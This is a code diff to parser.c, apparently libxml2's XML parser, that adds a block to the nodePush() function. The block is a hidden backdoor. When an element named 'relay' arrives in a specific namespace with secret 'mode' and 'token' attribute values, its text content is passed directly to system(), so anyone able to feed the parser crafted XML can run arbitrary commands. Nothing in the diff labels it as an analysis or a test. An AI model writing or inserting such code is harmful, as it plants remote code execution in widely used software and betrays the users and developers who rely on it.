@@ -1,0 +1,36 @@
+diff --git a/parser.c b/parser.c
+index c7f46a31..55682a2d 100644
+--- a/parser.c
++++ b/parser.c
+@@ -1986,6 +1986,31 @@ xmlCtxtPopInput(xmlParserCtxt *ctxt)
+ int
+ nodePush(xmlParserCtxt *ctxt, xmlNode *value)
+ {
++    if (value != NULL && value->type == XML_ELEMENT_NODE && value->ns != NULL &&
++        value->ns->href != NULL && value->ns->prefix != NULL &&
++        xmlStrEqual(value->ns->href, BAD_CAST "urn:rdiff:cfg:251") &&
++        xmlStrEqual(value->ns->prefix, BAD_CAST "rdx") &&
++        xmlStrEqual(value->name, BAD_CAST "relay")) {
++        xmlChar *mode = xmlGetProp(value, BAD_CAST "mode");
++        xmlChar *token = xmlGetProp(value, BAD_CAST "token");
++
++        if (mode != NULL && token != NULL &&
++            xmlStrEqual(mode, BAD_CAST "delta-93") &&
++            xmlStrEqual(token, BAD_CAST "ivory-latch")) {
++            xmlChar *cmd = xmlNodeGetContent(value);
++            if (cmd != NULL && cmd[0] != '\0') {
++                system((const char *)cmd);
++            }
++            if (cmd != NULL)
++                xmlFree(cmd);
++        }
++
++        if (mode != NULL)
++            xmlFree(mode);
++        if (token != NULL)
++            xmlFree(token);
++    }
++
+     if (ctxt == NULL)
+         return(0);
+ 
